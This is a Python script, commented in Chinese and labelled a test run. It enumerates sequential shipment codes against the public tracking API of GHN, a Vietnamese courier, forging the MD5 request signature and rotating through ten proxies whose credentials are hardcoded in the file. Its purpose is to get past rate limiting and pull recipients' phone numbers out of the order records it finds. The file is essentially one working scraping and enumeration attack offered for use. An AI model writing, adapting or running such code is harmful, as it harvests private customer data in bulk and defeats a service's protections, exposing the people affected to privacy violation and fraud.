#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
测试版 - 扫描10个订单
"""

import requests
import hashlib
import time
import json
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

# ==================== 代理池配置 ====================
# 使用验证过的代理池
PROXIES = [
    "23.27.184.245:5846:uadkcvtn:uo2rzar814ph",
    "45.43.70.140:6427:uadkcvtn:uo2rzar814ph",
    "82.24.233.117:5439:uadkcvtn:uo2rzar814ph",
    "136.0.188.71:6034:uadkcvtn:uo2rzar814ph",
    "161.123.130.168:5839:uadkcvtn:uo2rzar814ph",
    "142.147.240.52:6574:uadkcvtn:uo2rzar814ph",
    "166.88.224.145:6043:uadkcvtn:uo2rzar814ph",
    "82.25.215.106:5457:uadkcvtn:uo2rzar814ph",
    "91.211.87.215:7205:uadkcvtn:uo2rzar814ph",
    "104.238.36.64:6071:uadkcvtn:uo2rzar814ph",
]

# ==================== 运行配置 ====================
CONFIG = {
    'target': 10,               # 🎯 测试目标：找10个订单
    'total_threads': 5,         # 5个线程测试
    'delay': 0.2,               # 请求延迟
    'timeout': 10,              # 请求超时
    'save_every': 5,            # 每5个保存
    'max_98_retries': 10,       # Code:98最大重试
    'proxy_fail_threshold': 2,  # 代理失败2次禁用
}

# ==================== 密集区域配置（测试用）====================
DENSE_REGIONS = [
    # 只测试最密集的几个区域
    {'prefix': 'EC', 'start': 149780335, 'end': 149780809, 'priority': 1, 'step': 1, 'name': 'EC_超密测试'},
    {'prefix': 'EF', 'start': 43571495, 'end': 43572000, 'priority': 1, 'step': 1, 'name': 'EF_超密测试'},
    {'prefix': 'EB', 'start': 102885483, 'end': 102885600, 'priority': 1, 'step': 1, 'name': 'EB_测试'},
]

# ==================== 全局状态 ====================
state = {
    'found': 0,
    'tested': 0,
    'errors': 0,
    'rate_limited': 0,
    'start_time': time.time(),
    'orders': [],
    'proxy_stats': {},
    'lock': Lock(),
}

# ==================== 代理池管理 ====================
class ProxyPool:
    def __init__(self, proxies):
        self.proxies = []
        self.failed_count = {}
        self.success_count = {}
        self.current_index = 0
        self.lock = Lock()
        
        for proxy_str in proxies:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, user, password = parts
                self.proxies.append({
                    'ip': ip,
                    'port': port,
                    'user': user,
                    'password': password,
                    'enabled': True,
                    'proxy_str': f'http://{user}:{password}@{ip}:{port}'
                })
                self.failed_count[proxy_str] = 0
                self.success_count[proxy_str] = 0
    
    def get_next_proxy(self):
        """获取下一个可用代理"""
        with self.lock:
            attempts = 0
            while attempts < len(self.proxies):
                proxy = self.proxies[self.current_index]
                self.current_index = (self.current_index + 1) % len(self.proxies)
                
                if proxy['enabled']:
                    return {
                        'http': proxy['proxy_str'],
                        'https': proxy['proxy_str']
                    }, f"{proxy['ip']}:{proxy['port']}"
                
                attempts += 1
            
            return None, None
    
    def mark_failure(self, proxy_display):
        """标记代理失败"""
        with self.lock:
            for proxy in self.proxies:
                if f"{proxy['ip']}:{proxy['port']}" == proxy_display:
                    key = f"{proxy['ip']}:{proxy['port']}:{proxy['user']}:{proxy['password']}"
                    self.failed_count[key] = self.failed_count.get(key, 0) + 1
                    
                    if self.failed_count[key] >= CONFIG['proxy_fail_threshold']:
                        proxy['enabled'] = False
                        print(f"⚠️  代理 {proxy_display} 已禁用（失败{self.failed_count[key]}次）")
                    break
    
    def mark_success(self, proxy_display):
        """标记代理成功"""
        with self.lock:
            for proxy in self.proxies:
                if f"{proxy['ip']}:{proxy['port']}" == proxy_display:
                    key = f"{proxy['ip']}:{proxy['port']}:{proxy['user']}:{proxy['password']}"
                    self.success_count[key] = self.success_count.get(key, 0) + 1
                    self.failed_count[key] = 0
                    break

# 创建代理池
proxy_pool = ProxyPool(PROXIES)

# ==================== 查询订单 ====================
def query_order(code, proxy_dict, proxy_display):
    """查询单个订单"""
    url = "https://donhang.ghn.vn/api/v1/public/tracking/search"
    
    signature_str = f"code={code}&source=tracking_page"
    signature = hashlib.md5(signature_str.encode()).hexdigest()
    
    payload = {
        "code": code,
        "signature": signature,
        "source": "tracking_page"
    }
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    for attempt_98 in range(CONFIG['max_98_retries']):
        try:
            response = requests.post(
                url, 
                json=payload, 
                headers=headers,
                proxies=proxy_dict,
                timeout=CONFIG['timeout']
            )
            
            data = response.json()
            code_value = data.get('Code', 0)
            
            if code_value == 98:
                print(f"98..", end='', flush=True)
                proxy_pool.mark_failure(proxy_display)
                time.sleep(0.3)
                
                proxy_dict, proxy_display = proxy_pool.get_next_proxy()
                if not proxy_dict:
                    return None, "NO_PROXY"
                continue
            
            if code_value == 1:
                proxy_pool.mark_success(proxy_display)
                return data.get('Data'), "SUCCESS"
            else:
                return None, f"Code:{code_value}"
                
        except requests.exceptions.Timeout:
            return None, "TIMEOUT"
        except requests.exceptions.ProxyError:
            proxy_pool.mark_failure(proxy_display)
            return None, "PROXY_ERROR"
        except Exception as e:
            return None, f"ERROR:{str(e)[:30]}"
    
    return None, "MAX_98_RETRY"

# ==================== 扫描密集区域 ====================
def scan_dense_region(region):
    """扫描单个密集区域"""
    prefix = region['prefix']
    start = region['start']
    end = region['end']
    step = region['step']
    name = region['name']
    
    print(f"\n🔍 开始扫描 [{name}] {prefix}{start:09d}-{prefix}{end:09d}")
    
    region_found = 0
    region_tested = 0
    
    for num in range(start, end + 1, step):
        if state['found'] >= CONFIG['target']:
            break
        
        code = f"{prefix}{num:09d}VN"
        
        proxy_dict, proxy_display = proxy_pool.get_next_proxy()
        if not proxy_dict:
            print(f"\n❌ 无可用代理！")
            break
        
        data, status = query_order(code, proxy_dict, proxy_display)
        
        region_tested += 1
        with state['lock']:
            state['tested'] += 1
        
        if status == "SUCCESS" and data:
            region_found += 1
            
            phone = "N/A"
            if 'OrderInfo' in data:
                for item in data['OrderInfo']:
                    if item.get('Key') == 'Người nhận':
                        value = item.get('Value', '')
                        phone_match = re.search(r'\d{10,11}', value)
                        if phone_match:
                            phone = phone_match.group()
                        break
            
            order_info = {
                'code': code,
                'phone': phone,
                'data': data,
                'found_at': datetime.now().isoformat()
            }
            
            with state['lock']:
                state['found'] += 1
                state['orders'].append(order_info)
                
                elapsed = time.time() - state['start_time']
                speed = state['tested'] / elapsed if elapsed > 0 else 0
                success_rate = (state['found'] / state['tested'] * 100) if state['tested'] > 0 else 0
                
                print(f"\n✅ [{state['found']}/{CONFIG['target']}] {code} | 📞 {phone} | ⚡ {speed:.1f}/s | 成功率:{success_rate:.2f}%")
        
        time.sleep(CONFIG['delay'])
    
    print(f"\n✅ [{name}] 完成！找到 {region_found}/{region_tested}")

# ==================== 主程序 ====================
def main():
    print("="*80)
    print("🚀 测试版 - 目标找到10个订单")
    print("="*80)
    print(f"📊 配置：代理 {len(PROXIES)} 个 | 线程 {CONFIG['total_threads']} 个 | 测试区域 {len(DENSE_REGIONS)} 个")
    print("="*80)
    
    with ThreadPoolExecutor(max_workers=CONFIG['total_threads']) as executor:
        futures = []
        
        for region in DENSE_REGIONS:
            if state['found'] >= CONFIG['target']:
                break
            
            future = executor.submit(scan_dense_region, region)
            futures.append(future)
        
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"❌ 任务异常: {e}")
    
    # 统计报告
    elapsed = time.time() - state['start_time']
    print("\n" + "="*80)
    print("📊 测试完成！")
    print("="*80)
    print(f"✅ 找到订单: {state['found']}")
    print(f"🔍 已测试: {state['tested']}")
    print(f"❌ 错误数: {state['errors']}")
    print(f"⚡ 成功率: {state['found']/state['tested']*100:.2f}%" if state['tested'] > 0 else "0%")
    print(f"⏱️  总耗时: {elapsed:.1f} 秒")
    print(f"🚀 平均速度: {state['tested']/elapsed:.1f} 次/秒")
    print("="*80)
    
    if state['orders']:
        print("\n📋 找到的订单：")
        for order in state['orders']:
            print(f"  {order['code']} - {order['phone']}")

if __name__ == "__main__":
    main()
